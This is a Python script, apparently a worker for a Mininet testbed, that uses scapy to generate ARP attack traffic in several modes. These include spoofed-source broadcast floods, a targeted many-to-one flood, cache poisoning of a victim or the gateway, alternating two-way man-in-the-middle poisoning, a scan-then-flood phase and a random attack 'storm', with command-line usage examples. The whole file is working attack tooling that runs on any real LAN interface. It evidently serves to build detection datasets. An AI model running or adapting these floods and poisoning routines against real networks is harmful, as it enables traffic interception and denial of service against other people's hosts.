#!/usr/bin/env python3
"""
attack_traffic.py — Single-host ARP attack worker
=================================================

This is the per-host engine. It runs ONE attack mode on ONE interface.
The orchestrator (run_attack.sh) launches many copies of this in different
Mininet host namespaces to create realistic distributed attack scenarios.

Attack modes (each covers a real-world attack vector):
  flood_basic      — Plain broadcast ARP request flood (no spoofing)
  flood_mac        — Flood with random source MAC per packet (MAC spoofing)
  flood_ip         — Flood with random source IP per packet (IP spoofing)
  flood_both       — Flood with random MAC AND IP (combo spoofing)
  flood_target     — Flood directed at a single victim IP (many->one DDoS leg)
  poison_victim    — Unicast ARP replies poisoning a victim's cache
  poison_gateway   — Claim to be the gateway via broadcast ARP replies
  mitm_pair        — Alternating two-way poison between two victims
  scan_then_flood  — Slow scan for 1/3 of duration, then flood
  storm            — Random rotation through several attacks

USAGE (standalone):
    sudo python3 attack_traffic.py --iface h1-eth0 \\
        --mode flood_both --duration 60 --pps 1500

    sudo python3 attack_traffic.py --iface h1-eth0 \\
        --mode flood_target --target 10.2.1.1 --duration 60 --pps 2000

    sudo python3 attack_traffic.py --iface h1-eth0 \\
        --mode poison_victim --target 10.1.3.1 --spoof-ip 10.1.1.1 \\
        --duration 60 --pps 400

USAGE (orchestrated):
    See run_attack.sh — it drives many copies of this across Mininet hosts.
"""

import argparse
import os
import random
import sys
import time

try:
    from scapy.all import Ether, ARP, sendp, get_if_hwaddr, get_if_addr
except ImportError:
    sys.stderr.write("scapy not installed. sudo apt install python3-scapy\n")
    sys.exit(1)


BCAST_MAC = "ff:ff:ff:ff:ff:ff"
ZERO_MAC  = "00:00:00:00:00:00"

# 16 testbed host IPs: 10.1.1.1..10.1.8.1  and  10.2.1.1..10.2.8.1
ALL_HOST_IPS = [f"10.{sw}.{j}.1" for sw in (1, 2) for j in range(1, 9)]


def rand_mac(prefix="02:de:ad"):
    return "%s:%02x:%02x:%02x" % (
        prefix,
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )


def rand_ip():
    return "10.%d.%d.%d" % (
        random.randint(1, 2),
        random.randint(0, 255),
        random.randint(1, 254),
    )


# ── Packet builders ──────────────────────────────────────────────────────────

def b_flood_basic(ctx):
    tgt = ctx.target or "10.2.1.1"
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst=tgt))


def b_flood_mac(ctx):
    m = rand_mac()
    tgt = ctx.target or "10.2.1.1"
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst=tgt))


def b_flood_ip(ctx):
    tgt = ctx.target or "10.2.1.1"
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=rand_ip(),
                hwdst=ZERO_MAC, pdst=tgt))


def b_flood_both(ctx):
    m = rand_mac(); i = rand_ip()
    tgt = ctx.target or "10.2.1.1"
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=i, hwdst=ZERO_MAC, pdst=tgt))


def b_flood_target(ctx):
    """many->one DDoS: each attacker hammers the same victim."""
    m = rand_mac(); i = rand_ip()
    tgt = ctx.target or "10.2.1.1"
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=i, hwdst=ZERO_MAC, pdst=tgt))


def b_poison_victim(ctx):
    """Unicast-looking ARP reply (sent via broadcast so it reaches victim)."""
    spoof_ip = ctx.spoof_ip or "10.1.1.1"
    victim   = ctx.target  or random.choice(ALL_HOST_IPS)
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc=spoof_ip,
                hwdst=BCAST_MAC, pdst=victim))


def b_poison_gateway(ctx):
    """Claim to be the gateway — flooded to all hosts."""
    gw = ctx.spoof_ip or "10.1.1.1"
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc=gw,
                hwdst=BCAST_MAC, pdst=gw))


def b_mitm_pair(ctx):
    """Alternate poisoning two victims into thinking we're each other."""
    a = ctx.target    or "10.1.2.1"
    b = ctx.spoof_ip  or "10.1.3.1"
    pair = [(a, b), (b, a)]
    victim_ip, fake_ip = pair[ctx.counter % 2]
    ctx.counter += 1
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc=fake_ip,
                hwdst=BCAST_MAC, pdst=victim_ip))


# ── Attack runners ───────────────────────────────────────────────────────────

class Ctx:
    def __init__(self, iface, real_mac, real_ip, target, spoof_ip):
        self.iface    = iface
        self.real_mac = real_mac
        self.real_ip  = real_ip
        self.target   = target
        self.spoof_ip = spoof_ip
        self.counter  = 0


BUILDERS = {
    "flood_basic":    b_flood_basic,
    "flood_mac":      b_flood_mac,
    "flood_ip":       b_flood_ip,
    "flood_both":     b_flood_both,
    "flood_target":   b_flood_target,
    "poison_victim":  b_poison_victim,
    "poison_gateway": b_poison_gateway,
    "mitm_pair":      b_mitm_pair,
}


def run_simple(ctx, build_fn, duration, pps, label, max_packets=None):
    """
    Run one builder at `pps` for `duration` seconds in fixed batches.
    If max_packets is set, also stop as soon as that many packets have been sent.
    """
    batch_size     = max(10, pps // 10)
    batch_interval = batch_size / max(pps, 1)
    t_start = time.time()
    t_end   = t_start + duration
    sent = 0
    last_report = t_start

    while time.time() < t_end:
        if max_packets is not None and sent >= max_packets:
            break
        # If we're close to the cap, shrink the final batch
        this_batch = batch_size
        if max_packets is not None:
            remaining = max_packets - sent
            if remaining < this_batch:
                this_batch = max(1, remaining)

        bs = time.time()
        batch = [build_fn(ctx) for _ in range(this_batch)]
        try:
            sendp(batch, iface=ctx.iface, verbose=False)
        except Exception as e:
            sys.stderr.write(f"[{label}] send error: {e}\n")
            time.sleep(0.1)
            continue
        sent += this_batch
        now = time.time()
        if now - last_report >= 5.0:
            elapsed = now - t_start
            rate = sent / elapsed if elapsed > 0 else 0
            cap = f" cap={max_packets}" if max_packets else ""
            print(f"  [{label}] +{elapsed:5.1f}s sent={sent:>7} rate={rate:.0f}pps{cap}",
                  flush=True)
            last_report = now
        dt = time.time() - bs
        if dt < batch_interval:
            time.sleep(batch_interval - dt)

    return sent


def run_scan_then_flood(ctx, duration, pps, label):
    """1/3 of the time slow recon, then 2/3 full flood."""
    scan_dur  = max(2, duration // 3)
    flood_dur = duration - scan_dur

    print(f"  [{label}] phase1: scan {scan_dur}s @ {max(20, pps // 20)}pps", flush=True)
    scan_ctx = Ctx(ctx.iface, ctx.real_mac, ctx.real_ip, None, None)

    def scan_builder(c):
        c.counter += 1
        tgt = ALL_HOST_IPS[c.counter % len(ALL_HOST_IPS)]
        return (Ether(src=c.real_mac, dst=BCAST_MAC) /
                ARP(op=1, hwsrc=c.real_mac, psrc=c.real_ip,
                    hwdst=ZERO_MAC, pdst=tgt))

    s1 = run_simple(scan_ctx, scan_builder, scan_dur, max(20, pps // 20),
                    f"{label}/scan")

    print(f"  [{label}] phase2: flood {flood_dur}s @ {pps}pps", flush=True)
    s2 = run_simple(ctx, b_flood_both, flood_dur, pps, f"{label}/flood")
    return s1 + s2


def run_storm(ctx, duration, pps, label):
    """Rotate random attack types every 3s."""
    choices = ["flood_basic", "flood_mac", "flood_ip", "flood_both",
               "poison_gateway"]
    t0 = time.time()
    total = 0
    while time.time() - t0 < duration:
        remaining = duration - (time.time() - t0)
        chunk = min(3, remaining)
        if chunk <= 0:
            break
        name = random.choice(choices)
        print(f"  [{label}/storm] -> {name} ({chunk:.0f}s)", flush=True)
        total += run_simple(ctx, BUILDERS[name], int(chunk), pps,
                            f"{label}/{name}")
        ctx.counter = 0
    return total


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description="Single-host ARP attack worker")
    ap.add_argument("--iface",    required=True, help="Interface, e.g. h1-eth0")
    ap.add_argument("--mode",     required=True,
                    choices=list(BUILDERS.keys()) + ["scan_then_flood", "storm"])
    ap.add_argument("--duration", type=int, default=60, help="Seconds")
    ap.add_argument("--pps",      type=int, default=1000,
                    help="Target packets per second")
    ap.add_argument("--target",
                    help="Target IP (victim). Used by flood_target, poison_*, mitm_pair")
    ap.add_argument("--spoof-ip", dest="spoof_ip",
                    help="IP to impersonate (for poison_* and mitm_pair)")
    ap.add_argument("--total-packets", dest="total_packets", type=int, default=None,
                    help="Stop after sending this many packets (useful for moderate attacks)")
    ap.add_argument("--label",    default=None,
                    help="Label shown in log lines (defaults to mode)")
    args = ap.parse_args()

    if os.geteuid() != 0:
        sys.stderr.write("needs root (scapy raw sockets)\n")
        sys.exit(1)

    try:
        real_mac = get_if_hwaddr(args.iface)
        real_ip  = get_if_addr(args.iface)
    except Exception as e:
        sys.stderr.write(f"iface read failed: {e}\n")
        sys.exit(1)

    ctx = Ctx(args.iface, real_mac, real_ip, args.target, args.spoof_ip)
    label = args.label or args.mode

    print(f"[atk] iface={args.iface} src={real_ip} ({real_mac})", flush=True)
    print(f"[atk] mode={args.mode} dur={args.duration}s pps={args.pps}"
          f" target={args.target} spoof={args.spoof_ip}", flush=True)

    t0 = time.time()

    if args.mode == "scan_then_flood":
        sent = run_scan_then_flood(ctx, args.duration, args.pps, label)
    elif args.mode == "storm":
        sent = run_storm(ctx, args.duration, args.pps, label)
    else:
        sent = run_simple(ctx, BUILDERS[args.mode], args.duration,
                          args.pps, label, max_packets=args.total_packets)

    dt = time.time() - t0
    rate = sent / dt if dt > 0 else 0
    print(f"[atk] DONE {args.mode}  sent={sent} in {dt:.1f}s (~{rate:.0f}pps)",
          flush=True)


if __name__ == "__main__":
    main()